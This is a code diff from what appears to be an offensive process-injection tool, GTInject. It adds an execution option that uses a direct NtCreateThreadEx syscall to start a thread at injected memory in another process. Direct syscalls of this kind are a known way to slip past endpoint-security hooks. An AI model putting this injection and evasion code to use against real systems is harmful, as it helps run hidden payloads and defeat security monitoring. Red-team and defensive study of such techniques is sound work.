@@ -6,6 +6,7 @@ using System.Threading;
 using static GTInject.memoryOptions.memory;
 using System.Net.Http;
 using System.Xml.Linq;
+using GTInject.SysCalls;
 
 namespace GTInject.Injection
 {
@@ -25,6 +26,8 @@ namespace GTInject.Injection
                     return execopt201(memaddr, pid, tid);
                 case 202:
                     return execopt202(memaddr, pid, tid);
+                case 300:
+                    return execopt300(memaddr, pid, tid);
                 default:
                     Console.WriteLine( "[-] Not a valid Thread Execution option integer");
                     return IntPtr.Zero;
@@ -173,6 +176,28 @@ namespace GTInject.Injection
                 Console.WriteLine("     NTAPI for NtQueueApcThread executed");
                 return targetThread; // returning an IntPtr, threadhandle is already an IntPtr
             }
+        }
+        private static IntPtr execopt300(IntPtr memaddr, Process ProcID, int ThreadID)
+        {
+            /////////////////////////////////////
+            // OPTION 300 == Direct Syscall - NtCreateThreadEx
+            /////////////////////////////////////
+
+            // set up the syscall for NtCreateThreadEx
+            var hProcess = ProcID.Handle;
+            IntPtr hThread = IntPtr.Zero;
+            var status = Syscalls.SysclNtCreateThreadEx(out hThread, WinNative.ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, hProcess, memaddr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
+            Console.WriteLine("     Direct Syscall to CreateThread " + status);
+
+            if (status == WinNative.NTSTATUS.Success)
+            {
+                return memaddr;
+            }
+            else
+            {
+                return IntPtr.Zero;
+            }
+
         }
 
         /////////////////////////////////////
